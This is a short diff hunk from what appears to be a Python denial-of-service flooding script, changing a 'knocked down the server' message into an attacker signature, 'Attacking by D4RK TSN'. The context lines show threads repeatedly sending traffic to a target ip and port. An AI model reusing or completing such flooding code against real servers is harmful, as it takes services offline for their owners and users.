@@ -60,7 +60,7 @@ def start():
             print("Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
         except:
             s.close()
-            print('SUCCESFUL KNOCKED DOWN THE SERVER')
+            print('Attacking by D4RK TSN')
 
 for x in range(thread):
     thred = threading.Thread(target=start)
